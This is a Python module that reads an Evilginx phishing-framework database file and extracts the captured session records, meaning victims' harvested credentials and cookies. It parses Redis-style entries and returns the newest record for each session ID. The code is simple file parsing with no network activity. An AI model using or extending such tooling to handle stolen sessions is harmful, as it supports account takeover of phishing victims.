"""
Database Reader - Reads sessions from Evilginx database file
Same logic as Go application's ReadLatestSession function
"""

import json
import os
from typing import Dict, List, Optional

def read_latest_session(file_path: str) -> Optional[Dict]:
    """
    Read the latest session from the database file.
    Same logic as Go's ReadLatestSession function.
    """
    if not os.path.exists(file_path):
        return None
    
    try:
        latest_session = None
        current_session_data = ""
        capture_session = False
        
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as file:
            for line in file:
                line = line.strip()
                
                # Check if line starts with "$" (Redis RDB format marker)
                if line.startswith("$"):
                    if capture_session and current_session_data:
                        # Try to parse the session JSON
                        try:
                            session = json.loads(current_session_data)
                            if session.get("id", 0) != 0:
                                latest_session = session
                        except json.JSONDecodeError:
                            pass
                        current_session_data = ""
                    capture_session = True
                
                # If we're capturing and line starts with "{", it's JSON
                if capture_session and line.startswith("{"):
                    current_session_data = line
        
        # Handle last session
        if capture_session and current_session_data:
            try:
                session = json.loads(current_session_data)
                if session.get("id", 0) != 0:
                    latest_session = session
            except json.JSONDecodeError:
                pass
        
        return latest_session
        
    except Exception as e:
        print(f"Error reading database: {e}")
        return None

def get_all_sessions(file_path: str, limit: int = 100) -> List[Dict]:
    """
    Get all sessions from the database file.
    Returns list of sessions sorted by ID (newest first).
    Properly parses Redis RDB format.
    """
    print(f"[DB Reader] ========================================")
    print(f"[DB Reader] Reading from: {file_path}")
    
    if not os.path.exists(file_path):
        print(f"[DB Reader] ERROR: File does not exist!")
        return []
    
    print(f"[DB Reader] File exists, reading...")
    sessions_dict = {}  # Use dict to track latest version of each session ID
    lines = []
    sessions_found_count = 0
    json_parse_errors = 0
    
    try:
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as file:
            lines = file.readlines()
        
        print(f"[DB Reader] Read {len(lines)} lines from file")
        
        i = 0
        sessions_keys_found = 0
        while i < len(lines):
            line = lines[i].strip()
            
            # Look for "sessions:X" pattern (where X is a number)
            if line.startswith("sessions:") and not line.startswith("sessions:0:id"):
                sessions_keys_found += 1
                session_key = line
                # Skip metadata entries
                if ":id" in session_key or ":0:" in session_key:
                    i += 1
                    continue
                
                # The next line should be the length indicator like "$451"
                if i + 1 < len(lines):
                    length_line = lines[i + 1].strip()
                    if length_line.startswith("$"):
                        # The line after that should be the JSON
                        if i + 2 < len(lines):
                            json_line = lines[i + 2].strip()
                            if json_line.startswith("{"):
                                try:
                                    session = json.loads(json_line)
                                    session_id = session.get("id", 0)
                                    if session_id > 0:
                                        sessions_found_count += 1
                                        # DON'T AGGREGATE - keep entries exactly as they come from DB
                                        # Just keep the latest entry for each session ID, no merging, no editing
                                        if session_id not in sessions_dict:
                                            sessions_dict[session_id] = session
                                            print(f"[DB Reader] Found session ID: {session_id}")
                                        else:
                                            # Keep the one with latest update_time - no merging, just replace
                                            existing = sessions_dict[session_id]
                                            if session.get("update_time", 0) > existing.get("update_time", 0):
                                                sessions_dict[session_id] = session
                                                print(f"[DB Reader] Updated session ID: {session_id} (newer update_time, no merging)")
                                            # If existing is newer, keep it - don't touch anything
                                except json.JSONDecodeError as e:
                                    json_parse_errors += 1
                                    if json_parse_errors <= 3:  # Only print first few errors
                                        print(f"[DB Reader] JSON decode error at line {i+3}: {str(e)[:100]}")
                            else:
                                print(f"[DB Reader] Line {i+3} doesn't start with {{: {json_line[:50]}")
                        else:
                            print(f"[DB Reader] No JSON line after length indicator at line {i+1}")
                    else:
                        print(f"[DB Reader] No length indicator after session key at line {i+1}: {length_line[:50]}")
                else:
                    print(f"[DB Reader] No line after session key at line {i}")
                i += 3
                continue
            i += 1
        
        print(f"[DB Reader] Found {sessions_keys_found} session keys in file")
        
        print(f"[DB Reader] Total session entries found: {sessions_found_count}")
        print(f"[DB Reader] Unique session IDs: {len(sessions_dict)}")
        print(f"[DB Reader] JSON parse errors: {json_parse_errors}")
        
        # Convert dict to list and sort by ID descending
        sessions = list(sessions_dict.values())
        sessions.sort(key=lambda x: x.get("id", 0), reverse=True)
        
        result = sessions[:limit] if limit > 0 else sessions
        print(f"[DB Reader] Returning {len(result)} sessions (limit: {limit})")
        print(f"[DB Reader] ========================================")
        
        return result
        
    except Exception as e:
        print(f"[DB Reader] Error reading all sessions: {e}")
        import traceback
        traceback.print_exc()
        return []

